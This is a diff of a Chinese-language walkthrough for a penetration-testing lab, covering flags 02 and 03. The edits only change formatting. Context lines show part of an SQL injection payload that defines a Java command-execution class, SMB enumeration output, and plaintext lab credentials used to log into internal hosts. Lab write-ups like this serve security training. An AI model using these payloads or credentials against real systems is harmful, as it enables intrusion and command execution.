@@ -212,10 +212,6 @@ start vulscan
 # flag02
 
 参考这篇 [靶机WP博客](https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/)
-
-
-
-
 ```bash
 GET / HTTP/1.1
 Host: 39.101.161.22
@@ -251,7 +247,6 @@ public class CommandExecutor {
     }
 }
 '';commit;end;') from dual)>1 --
-
 ```
 
 ### 创建用于执行命令的函数（execute_command）
@@ -404,7 +399,7 @@ SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [+] iZzvg0io6q1o5hZ\administ
 
 
 ### 七、启动远程连接
-#### 1.输入账号密码
+#### 1.登录172.23.4.51
 ```ini
 administrator
 abc123!@#
@@ -426,7 +421,8 @@ readme.txt
 
 # flag03
 
-结合之前扫描结果和刚才的账号密码，登录`172.23.4.12`
+结合之前扫描结果和刚才的账号密码，
+## 登录`172.23.4.12`
 ```
 usera@pentest.me
 Admin3gv83
